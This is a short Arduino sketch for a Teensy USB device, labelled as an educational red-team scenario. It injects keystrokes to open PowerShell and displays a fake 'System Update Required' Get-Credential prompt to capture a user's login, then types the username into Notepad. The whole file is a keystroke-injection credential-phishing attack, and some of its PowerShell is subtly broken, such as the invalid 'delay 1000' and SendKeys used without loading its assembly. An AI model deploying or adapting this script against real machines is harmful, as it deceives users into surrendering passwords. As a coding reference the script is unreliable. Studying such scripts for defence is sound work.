/*
 * TeensyRedOps - Educational Scenario TRO-003
 * Scenario: Credential Hunter (UI-Based)
 *
 * Objective:
 *   Demonstrate UI spoofing and input capture concepts.
 *
 * [!] FOR EDUCATIONAL RESEARCH ONLY.
 */

void setup() {
  delay(3000);

  // 1. Open PowerShell
  Keyboard.set_modifier(MODIFIERKEY_LEFT_GUI);
  Keyboard.set_key1(KEY_R);
  Keyboard.send_now();
  delay(500);
  clearKeys();
  Keyboard.print("powershell");
  Keyboard.press(KEY_ENTER);
  Keyboard.release(KEY_ENTER);
  delay(2000);

  // 2. Trigger Credential Prompt
  // This script pops the UI and then shows the 'Username' in a safe way.
  String psCmd = "$c = Get-Credential -UserName 'Security_Research' -Message "
                 "'System Update Required for Hardware Verification'; ";
  psCmd += "Start-Process notepad; delay 1000; ";
  psCmd += "[System.Windows.Forms.SendKeys]::SendWait($c.UserName);";

  Keyboard.print(psCmd);
  Keyboard.press(KEY_ENTER);
  Keyboard.release(KEY_ENTER);
}

void clearKeys() {
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
}

void loop() {}
